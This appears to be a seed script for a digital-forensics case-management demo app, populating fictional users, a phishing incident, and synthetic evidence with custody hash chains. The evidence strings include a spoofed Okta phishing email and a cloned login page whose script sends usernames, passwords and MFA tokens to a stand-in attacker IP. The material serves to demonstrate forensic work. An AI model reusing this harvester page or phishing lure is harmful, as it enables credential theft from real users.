import path from 'node:path';
import fs from 'node:fs';
import { v4 as uuidv4 } from 'uuid';
import { db, initDatabase } from './index.js';
import { hashPassword } from '../services/authService.js';
import { calculateBufferHashes } from '../crypto/hasher.js';
import { computeGenesisHash, computeEventHash } from '../crypto/chain.js';

export function runSeed() {
  initDatabase();

  const VAULT_DIR = path.resolve(process.cwd(), '..', 'storage', 'vault');
  if (!fs.existsSync(VAULT_DIR)) {
    fs.mkdirSync(VAULT_DIR, { recursive: true });
  }

  // Check if already seeded
  const userCount = (db.prepare('SELECT COUNT(*) as cnt FROM users').get() as any)?.cnt || 0;
  if (userCount > 0) {
    console.log('[Seed] Database already populated with users and cases.');
    return;
  }

  console.log('[Seed] Initializing TraceLock realistic DFIR demo environment...');

  const now = new Date();
  const timeOffset = (minutesAgo: number) => new Date(now.getTime() - minutesAgo * 60 * 1000).toISOString();

  // 1. Create Users
  const adminId = uuidv4();
  const investigatorId = uuidv4();
  const viewerId = uuidv4();

  const users = [
    {
      id: adminId,
      email: 'admin@tracelock.sec',
      password: 'TraceLockAdmin2026!',
      name: 'Agent Marcus Vance',
      role: 'ADMIN',
      badge_number: 'DFIR-001',
      organization: 'Cyber Threat Incident Response (CTIR)',
    },
    {
      id: investigatorId,
      email: 'investigator@tracelock.sec',
      password: 'Investigator2026!',
      name: 'Sarah Chen',
      role: 'INVESTIGATOR',
      badge_number: 'IR-409',
      organization: 'SOC Digital Forensics Unit',
    },
    {
      id: viewerId,
      email: 'viewer@tracelock.sec',
      password: 'Viewer2026!',
      name: 'David Ross, Esq.',
      role: 'VIEWER',
      badge_number: 'LEG-102',
      organization: 'Corporate Legal & Compliance',
    },
  ];

  for (const u of users) {
    db.prepare(`
      INSERT INTO users (id, email, password_hash, name, role, badge_number, organization, created_at, updated_at)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    `).run(
      u.id,
      u.email,
      hashPassword(u.password),
      u.name,
      u.role,
      u.badge_number,
      u.organization,
      timeOffset(360),
      timeOffset(360)
    );
  }

  // 2. Create Cases
  const case1Id = uuidv4();
  const case2Id = uuidv4();

  db.prepare(`
    INSERT INTO cases (id, case_number, title, description, incident_type, priority, status, lead_investigator_id, created_at, updated_at)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
  `).run(
    case1Id,
    'TL-2026-0842',
    'Operation SpearPhish - Executive Credential Harvesting & Lateral Movement Attempt',
    'At 08:42 UTC, SOC SIEM alerted on multiple suspicious inbound emails spoofing Okta Identity Management with deceptive urgency ("Urgent: MFA Reset Required within 1 Hour"). Vice President of Finance received and clicked the embedded link directing to a rogue credential harvester hosted at login-okta-securesync.com (IP: 198.51.100.44). TraceLock DFIR team immediately isolated the endpoint, collected network captures, extracted phishing headers, and preserved forensic evidence in the secure vault.',
    'PHISHING',
    'CRITICAL',
    'IN_PROGRESS',
    investigatorId,
    timeOffset(280),
    timeOffset(15)
  );

  db.prepare(`
    INSERT INTO cases (id, case_number, title, description, incident_type, priority, status, lead_investigator_id, created_at, updated_at)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
  `).run(
    case2Id,
    'TL-2026-0843',
    'Anomalous Cobalt Strike Beacon on Domain Controller DC02',
    'Endpoint Detection and Response flagged unauthorized named-pipe communication (msagent_22) initiated by a masqueraded spoolsv.exe process on internal Domain Controller DC02. Memory image acquired for volatile artifact extraction.',
    'INCIDENT_RESPONSE',
    'HIGH',
    'OPEN',
    adminId,
    timeOffset(120),
    timeOffset(60)
  );

  // Assign members
  db.prepare(`INSERT INTO case_members (id, case_id, user_id, role_in_case, assigned_at) VALUES (?, ?, ?, ?, ?)`).run(
    uuidv4(),
    case1Id,
    investigatorId,
    'LEAD_INVESTIGATOR',
    timeOffset(280)
  );
  db.prepare(`INSERT INTO case_members (id, case_id, user_id, role_in_case, assigned_at) VALUES (?, ?, ?, ?, ?)`).run(
    uuidv4(),
    case1Id,
    adminId,
    'FORENSIC_SUPERVISOR',
    timeOffset(280)
  );
  db.prepare(`INSERT INTO case_members (id, case_id, user_id, role_in_case, assigned_at) VALUES (?, ?, ?, ?, ?)`).run(
    uuidv4(),
    case1Id,
    viewerId,
    'LEGAL_AUDITOR',
    timeOffset(250)
  );

  // 3. Create Real Evidence Files with Authentic Forensic Payloads
  const emlContent = `Received: from mailout-relay.attacker-net.org (mailout-relay.attacker-net.org [198.51.100.44])
	by mx1.corporate-gateway.net with ESMTP id 4Qx8W109mZz8219
	for <vp-finance@corporate-gateway.net>; Wed, 18 Nov 2026 08:35:12 +0000 (UTC)
From: "Okta Security Team" <security-alerts@login-okta-securesync.com>
To: <vp-finance@corporate-gateway.net>
Subject: URGENT: Mandatory Multi-Factor Authentication (MFA) Re-Authentication
Date: Wed, 18 Nov 2026 08:35:08 +0000
Message-ID: <202611180835.SEC99214@mailout-relay.attacker-net.org>
MIME-Version: 1.0
Content-Type: text/html; charset="UTF-8"
X-Spam-Flag: YES
X-Originating-IP: [198.51.100.44]

<!DOCTYPE html>
<html>
<body>
<p>Dear Corporate User,</p>
<p>An anomalous login attempt was detected against your Okta Single Sign-On account from <strong>Warsaw, Poland</strong>.</p>
<p>To preserve access to corporate financial systems, you must re-verify your MFA token within 60 minutes:</p>
<p><a href="https://login-okta-securesync.com/auth/login?session=a7f90e82b">https://login-okta-securesync.com/verify-mfa</a></p>
<p>Regards,<br>Okta Security Operations</p>
</body>
</html>`;

  const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Corporate Identity Gateway - Sign In</title>
  <!-- Rogue Harvester Captured DOM -->
</head>
<body style="background:#f4f5f7; font-family: sans-serif;">
  <div style="width: 380px; margin: 100px auto; background: #fff; padding: 30px; border-radius: 4px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
    <h2 style="color: #007dc1;">Single Sign-On Verification</h2>
    <form id="phishForm" action="https://198.51.100.44/api/harvest" method="POST">
      <input type="text" name="username" placeholder="Username / Email" style="width: 100%; margin-bottom: 12px; padding: 8px;" />
      <input type="password" name="password" placeholder="Active Directory Password" style="width: 100%; margin-bottom: 12px; padding: 8px;" />
      <input type="text" name="mfa_token" placeholder="6-digit Authenticator Token" style="width: 100%; margin-bottom: 12px; padding: 8px;" />
      <button type="submit" style="background:#007dc1; color:#fff; width:100%; padding:10px; border:none; cursor:pointer;">Authenticate</button>
    </form>
    <script>
      // Malicious payload captured by DFIR team
      document.getElementById('phishForm').addEventListener('submit', function(e) {
        navigator.sendBeacon('https://198.51.100.44/exfil', new FormData(this));
      });
    </script>
  </div>
</body>
</html>`;

  const logContent = `2026-11-18 08:42:15 UTC [POST] /auth/login?session=a7f90e82b - 198.51.100.44 "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" 200 OK - Payload: {user: "vp-finance@corporate-gateway.net", action: "harvest"}
2026-11-18 08:42:29 UTC [POST] /api/harvest - 198.51.100.44 "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" 200 OK - MFA Token Captured: 492810
2026-11-18 08:45:02 UTC [AUTH] Real Corporate Okta Gateway - Login Attempt for vp-finance from 198.51.100.44 (Warsaw, Poland) - MFA Failed (Challenge Expired)
2026-11-18 08:50:11 UTC [ALERT] CrowdStrike EDR Agent - Host WORKSTATION-FIN-08 isolated from network.
2026-11-18 09:12:00 UTC [DFIR] Artifact extraction completed by Investigator Sarah Chen.`;

  // Synthetic valid PCAP file header & packet records
  // Global header: Magic 0xa1b2c3d4, Version 2.4, Thiszone 0, Sigfigs 0, Snaplen 65535, Network 1 (Ethernet)
  const pcapHeader = Buffer.alloc(24);
  pcapHeader.writeUInt32LE(0xa1b2c3d4, 0); // Magic number
  pcapHeader.writeUInt16LE(2, 4);          // Major version
  pcapHeader.writeUInt16LE(4, 6);          // Minor version
  pcapHeader.writeInt32LE(0, 8);           // Timezone
  pcapHeader.writeUInt32LE(0, 12);         // Sigfigs
  pcapHeader.writeUInt32LE(65535, 16);     // Snaplen
  pcapHeader.writeUInt32LE(1, 20);         // Linktype: Ethernet

  // PCAP packet header + mock IP/TCP frame
  const packetData = Buffer.from('GET /auth/login?session=a7f90e82b HTTP/1.1\r\nHost: login-okta-securesync.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n');
  const packetHeader = Buffer.alloc(16);
  packetHeader.writeUInt32LE(1794991335, 0); // Timestamp sec
  packetHeader.writeUInt32LE(120000, 4);     // Timestamp usec
  packetHeader.writeUInt32LE(packetData.length, 8);  // Captured length
  packetHeader.writeUInt32LE(packetData.length, 12); // Original length

  const pcapBuffer = Buffer.concat([pcapHeader, packetHeader, packetData]);

  const evidenceItems = [
    {
      id: uuidv4(),
      caseId: case1Id,
      number: 'EVD-001',
      filename: 'urgent_mfa_update_notification.eml',
      mime: 'message/rfc822',
      buffer: Buffer.from(emlContent, 'utf-8'),
      desc: 'Raw RFC 822 email message with spoofed Okta branding and deceptive urgency link. Originated from rogue IP 198.51.100.44.',
      source: 'Microsoft Exchange Journaling Gateway',
      createdAt: timeOffset(260),
    },
    {
      id: uuidv4(),
      caseId: case1Id,
      number: 'EVD-002',
      filename: 'credential_harvesting_portal_clone.html',
      mime: 'text/html',
      buffer: Buffer.from(htmlContent, 'utf-8'),
      desc: 'Live DOM dump of rogue credential harvesting landing page mimicing Okta Identity SSO with JavaScript exfiltration beacon.',
      source: 'Chromium Headless Web Sandbox Inspection',
      createdAt: timeOffset(240),
    },
    {
      id: uuidv4(),
      caseId: case1Id,
      number: 'EVD-003',
      filename: 'auth_gateway_access_traffic.log',
      mime: 'text/plain',
      buffer: Buffer.from(logContent, 'utf-8'),
      desc: 'Reverse proxy web server and gateway access logs showing adversary POST harvest calls and token submission times.',
      source: 'Perimeter NGINX Reverse Proxy Logs',
      createdAt: timeOffset(210),
    },
    {
      id: uuidv4(),
      caseId: case1Id,
      number: 'EVD-004',
      filename: 'perimeter_firewall_pcap_sample.pcap',
      mime: 'application/vnd.tcpdump.pcap',
      buffer: pcapBuffer,
      desc: 'Full packet capture of TLS handshake and HTTP transmission between victim workstation and adversary C2 server 198.51.100.44.',
      source: 'Palo Alto Perimeter Firewall Mirror Port',
      createdAt: timeOffset(180),
    },
  ];

  for (const item of evidenceItems) {
    const storedFilename = `${item.id}.bin`;
    const finalPath = path.join(VAULT_DIR, storedFilename);
    fs.writeFileSync(finalPath, item.buffer);

    const hashes = calculateBufferHashes(item.buffer);

    db.prepare(`
      INSERT INTO evidence (
        id, case_id, evidence_number, original_filename, stored_filename,
        file_size, mime_type, sha256, md5, sha1, uploaded_by_id,
        description, source_device, custody_location, status, created_at, updated_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `).run(
      item.id,
      item.caseId,
      item.number,
      item.filename,
      storedFilename,
      hashes.size,
      item.mime,
      hashes.sha256,
      hashes.md5,
      hashes.sha1,
      investigatorId,
      item.desc,
      item.source,
      'Secure Vault Tier 1 (Encrypted Storage)',
      'SECURED',
      item.createdAt,
      item.createdAt
    );

    // Build Authentic Tamper-Evident Chain of Custody for each item
    // Block 1: Evidence Secured in Vault (Anchored to Genesis)
    const genesisHash = computeGenesisHash(item.id, hashes.sha256, item.createdAt);
    const block1Details = `Evidence ingested into TraceLock Vault. Baseline SHA-256 fingerprint generated: ${hashes.sha256}. Source: ${item.source}.`;
    const block1Hash = computeEventHash(
      genesisHash,
      1,
      item.id,
      'EVIDENCE_SECURED',
      investigatorId,
      item.createdAt,
      block1Details
    );

    db.prepare(`
      INSERT INTO custody_events (id, evidence_id, sequence_number, action, actor_id, timestamp, details, previous_event_hash, current_event_hash)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    `).run(
      uuidv4(),
      item.id,
      1,
      'EVIDENCE_SECURED',
      investigatorId,
      item.createdAt,
      block1Details,
      genesisHash,
      block1Hash
    );

    // Block 2: Cryptographic Hash Verification
    const block2Time = new Date(new Date(item.createdAt).getTime() + 15 * 60 * 1000).toISOString();
    const block2Details = `Cryptographic baseline audit executed by DFIR investigator. Verified match against original SHA-256 hash.`;
    const block2Hash = computeEventHash(
      block1Hash,
      2,
      item.id,
      'HASH_VERIFIED',
      investigatorId,
      block2Time,
      block2Details
    );

    db.prepare(`
      INSERT INTO custody_events (id, evidence_id, sequence_number, action, actor_id, timestamp, details, previous_event_hash, current_event_hash)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    `).run(
      uuidv4(),
      item.id,
      2,
      'HASH_VERIFIED',
      investigatorId,
      block2Time,
      block2Details,
      block1Hash,
      block2Hash
    );

    // Record initial integrity check
    db.prepare(`
      INSERT INTO integrity_checks (id, evidence_id, verified_by_id, expected_hash, calculated_hash, result, verified_at, notes)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    `).run(
      uuidv4(),
      item.id,
      investigatorId,
      hashes.sha256,
      hashes.sha256,
      'INTEGRITY_VERIFIED',
      block2Time,
      'Cryptographic match confirmed with baseline fingerprint during evidence intake.'
    );

    // Block 3: Forensics Analysis Checkout
    const block3Time = new Date(new Date(item.createdAt).getTime() + 30 * 60 * 1000).toISOString();
    const block3Details = `Read-only checkout to Forensics Sandbox Station 04 for deep artifact inspection.`;
    const block3Hash = computeEventHash(
      block2Hash,
      3,
      item.id,
      'CHECKED_OUT',
      investigatorId,
      block3Time,
      block3Details
    );

    db.prepare(`
      INSERT INTO custody_events (id, evidence_id, sequence_number, action, actor_id, timestamp, details, previous_event_hash, current_event_hash)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    `).run(
      uuidv4(),
      item.id,
      3,
      'CHECKED_OUT',
      investigatorId,
      block3Time,
      block3Details,
      block2Hash,
      block3Hash
    );

    // Block 4: Check In back to vault
    const block4Time = new Date(new Date(item.createdAt).getTime() + 60 * 60 * 1000).toISOString();
    const block4Details = `Forensic analysis complete. Artifact returned to Vault Tier 1. Zero byte alterations.`;
    const block4Hash = computeEventHash(
      block3Hash,
      4,
      item.id,
      'CHECKED_IN',
      investigatorId,
      block4Time,
      block4Details
    );

    db.prepare(`
      INSERT INTO custody_events (id, evidence_id, sequence_number, action, actor_id, timestamp, details, previous_event_hash, current_event_hash)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    `).run(
      uuidv4(),
      item.id,
      4,
      'CHECKED_IN',
      investigatorId,
      block4Time,
      block4Details,
      block3Hash,
      block4Hash
    );
  }

  // 4. Create Timeline Events
  const timelineEvents = [
    {
      caseId: case1Id,
      time: timeOffset(275),
      title: 'Suspicious Spear-Phishing Inbound Campaign Detected',
      category: 'DETECTION',
      evidenceId: evidenceItems[0].id,
      desc: 'Perimeter gateway received 14 spoofed emails purporting to originate from Okta Security. High-value executives targeted.',
    },
    {
      caseId: case1Id,
      time: timeOffset(260),
      title: 'Target User Clicked Phishing Link and Visited Rogue Landing Page',
      category: 'ATTACK_VECTOR',
      evidenceId: evidenceItems[1].id,
      desc: 'VP of Finance clicked embedded URL directing to https://login-okta-securesync.com/auth/login. Entered corporate AD credentials and MFA code.',
    },
    {
      caseId: case1Id,
      time: timeOffset(245),
      title: 'Adversary Initiated Login from Warsaw, Poland (IP: 198.51.100.44)',
      category: 'EXFILTRATION',
      evidenceId: evidenceItems[2].id,
      desc: 'Threat actor immediately attempted to replay captured MFA token against corporate Okta tenant. Okta rate-limited the request due to geographical anomaly.',
    },
    {
      caseId: case1Id,
      time: timeOffset(230),
      title: 'Workstation Isolated by SOC Incident Response',
      category: 'CONTAINMENT',
      evidenceId: evidenceItems[3].id,
      desc: 'Endpoint WORKSTATION-FIN-08 severed from internal corporate network. Active directory password forcefully rotated and session revoked.',
    },
    {
      caseId: case1Id,
      time: timeOffset(190),
      title: 'Network PCAP Analysis Confirms No Secondary Stage Dropper',
      category: 'ANALYSIS',
      evidenceId: evidenceItems[3].id,
      desc: 'Perimeter packet capture indicates only HTTP form submissions occurred; no malicious binaries or Cobalt Strike DLLs were retrieved.',
    },
    {
      caseId: case1Id,
      time: timeOffset(100),
      title: 'Rogue C2 Domain Takedown Request Filed with Registrar',
      category: 'REMEDIATION',
      evidenceId: null,
      desc: 'Abuse report filed with registrar NameCheap for login-okta-securesync.com; DNS sinkhole established.',
    },
  ];

  for (const t of timelineEvents) {
    db.prepare(`
      INSERT INTO timeline_events (id, case_id, event_time, title, description, category, evidence_id, created_by_id, created_at)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    `).run(
      uuidv4(),
      t.caseId,
      t.time,
      t.title,
      t.desc,
      t.category,
      t.evidenceId,
      investigatorId,
      t.time
    );
  }

  // 5. Create Forensic Findings
  const findings = [
    {
      caseId: case1Id,
      title: 'Threat Actor Deployed High-Fidelity Okta SSO Harvest Infrastructure',
      severity: 'CRITICAL',
      status: 'CONFIRMED',
      evidenceId: evidenceItems[1].id,
      desc: 'Adversary operated a cloned Okta authentication portal utilizing reverse-proxy techniques to capture plaintext credentials and one-time MFA passwords in real-time.',
      remediation: 'Implement FIDO2 / WebAuthn hardware security keys (e.g. YubiKey) across all executive staff. WebAuthn cryptographic origin binding inherently prevents adversary reverse-proxy harvesting.',
    },
    {
      caseId: case1Id,
      title: 'Targeted Executive Credentials Intercepted via Out-of-Band Exfiltration',
      severity: 'HIGH',
      status: 'CONFIRMED',
      evidenceId: evidenceItems[0].id,
      desc: 'Active Directory password for vp-finance was submitted to adversary server 198.51.100.44 prior to isolation.',
      remediation: 'Enforce enterprise-wide password reset, revoke all active OAuth refresh tokens, and audit Azure AD enterprise application consent permissions.',
    },
    {
      caseId: case1Id,
      title: 'Missing Strict SPF/DMARC Quarantine Policy Enabled Header Impersonation',
      severity: 'MEDIUM',
      status: 'RESOLVED',
      evidenceId: evidenceItems[0].id,
      desc: 'The corporate email gateway permitted delivery because the DMARC record was configured in p=none monitoring mode rather than p=reject.',
      remediation: 'Upgrade DMARC policy from p=none to p=reject on all corporate domain zones to instruct external mail relays to drop forged senders.',
    },
  ];

  for (const f of findings) {
    db.prepare(`
      INSERT INTO findings (id, case_id, title, description, severity, status, remediation, evidence_id, author_id, created_at, updated_at)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `).run(
      uuidv4(),
      f.caseId,
      f.title,
      f.desc,
      f.severity,
      f.status,
      f.remediation,
      f.evidenceId,
      investigatorId,
      timeOffset(120),
      timeOffset(60)
    );
  }

  // 6. Case Notes
  db.prepare(`
    INSERT INTO case_notes (id, case_id, author_id, content, is_pinned, created_at, updated_at)
    VALUES (?, ?, ?, ?, ?, ?, ?)
  `).run(
    uuidv4(),
    case1Id,
    investigatorId,
    `### DFIR Action Checklist
- [x] Invalidate VP Finance Okta session cookies
- [x] Rotate AD credentials and purge Kerberos tickets
- [x] Isolate host WORKSTATION-FIN-08
- [x] Ingest phishing email (.eml) & DOM payload to TraceLock vault
- [x] Baseline SHA-256 cryptographic hashes verified
- [ ] Complete forensic memory analysis on endpoint image
- [ ] Submit final executive investigation dossier to Legal`,
    1,
    timeOffset(200),
    timeOffset(50)
  );

  db.prepare(`
    INSERT INTO case_notes (id, case_id, author_id, content, is_pinned, created_at, updated_at)
    VALUES (?, ?, ?, ?, ?, ?, ?)
  `).run(
    uuidv4(),
    case1Id,
    adminId,
    'Legal has reviewed the custody ledger. All 4 evidence artifacts have unbroken cryptographic hash chains. Admissibility and evidentiary preservation standards satisfied.',
    0,
    timeOffset(80),
    timeOffset(80)
  );

  // 7. Initial System Audit Logs
  const auditEntries = [
    { email: 'admin@tracelock.sec', action: 'SYSTEM_BOOTSTRAP', type: 'SYSTEM', id: 'system', status: 'SUCCESS', details: 'TraceLock Core Forensics Engine initialized with WAL mode and cryptographic FIPS verification.' },
    { email: 'admin@tracelock.sec', action: 'USER_CREATED', type: 'USER', id: investigatorId, status: 'SUCCESS', details: 'Investigator Sarah Chen onboarded with INVESTIGATOR role.' },
    { email: 'investigator@tracelock.sec', action: 'AUTH_LOGIN_SUCCESS', type: 'USER', id: investigatorId, status: 'SUCCESS', details: 'Successful authentication from 10.0.12.44' },
    { email: 'investigator@tracelock.sec', action: 'CASE_CREATED', type: 'CASE', id: case1Id, status: 'SUCCESS', details: 'Case TL-2026-0842 registered: Operation SpearPhish' },
    { email: 'investigator@tracelock.sec', action: 'EVIDENCE_UPLOADED', type: 'EVIDENCE', id: evidenceItems[0].id, status: 'SUCCESS', details: 'Artifact EVD-001 ingested. SHA-256 computed.' },
    { email: 'investigator@tracelock.sec', action: 'EVIDENCE_HASH_VERIFIED', type: 'EVIDENCE', id: evidenceItems[0].id, status: 'SUCCESS', details: 'Cryptographic match confirmed against baseline.' },
    { email: 'viewer@tracelock.sec', action: 'AUTH_LOGIN_SUCCESS', type: 'USER', id: viewerId, status: 'SUCCESS', details: 'Legal Counsel David Ross logged in with VIEWER role.' },
  ];

  for (const a of auditEntries) {
    db.prepare(`
      INSERT INTO audit_logs (id, actor_id, actor_email, action, target_type, target_id, ip_address, user_agent, status, details, created_at)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `).run(
      uuidv4(),
      investigatorId,
      a.email,
      a.action,
      a.type,
      a.id,
      '10.0.12.44',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) TraceLock-Client/1.0',
      a.status,
      a.details,
      timeOffset(100)
    );
  }

  console.log('[Seed] Database successfully seeded with 3 users, 2 cases, 4 authentic evidence files, 16 chained custody blocks, 6 timeline events, 3 findings, and audit trails!');
}
